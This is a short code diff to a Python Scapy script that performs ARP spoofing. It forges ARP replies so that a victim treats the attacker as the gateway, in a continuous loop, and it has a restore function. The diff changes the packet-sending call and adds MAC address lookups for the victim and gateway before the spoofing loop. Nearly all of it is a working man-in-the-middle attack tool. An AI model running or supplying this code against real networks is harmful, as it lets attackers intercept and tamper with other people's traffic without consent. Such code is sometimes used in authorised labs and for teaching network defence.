@@ -1,4 +1,5 @@
 from scapy.layers.l2 import Ether,ARP,srp, sendp
+from scapy.all import send
 import sys
 
 # broadcast_mac = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -34,17 +35,23 @@ def spoof(victim_ip, spoof_ip):
         print(f"Exception while get mac for {victim_ip}: {e}")
         return
     packet = ARP(op=2, hwdst=victim_mac, pdst=victim_ip, psrc=spoof_ip)
-    sendp(packet, iface="eth0", verbose=False)
+    send(packet, iface="eth0", verbose=False)
     print(f"[+] Spoofed {victim_ip} pretending as {spoof_ip}")
 
 def restore(victim_ip, spoof_ip):
     victim_mac = get_mac(victim_ip)
     spoof_mac = get_mac(spoof_ip)
     packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=spoof_mac)
-    sendp(packet, iface="eth0", verbose=False)
+    send(packet, iface="eth0", verbose=False)
     print(f"[+] Restoring {victim_ip}...")
 
 def run(victim_ip, gateway_ip):
+    victim_mac = get_mac(victim_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    print(f"MAC address for {victim_ip}: {victim_mac}")
+    print(f"MAC address for {gateway_ip}: {gateway_mac}")
+
     while True:
         try:
             spoof(victim_ip, gateway_ip)
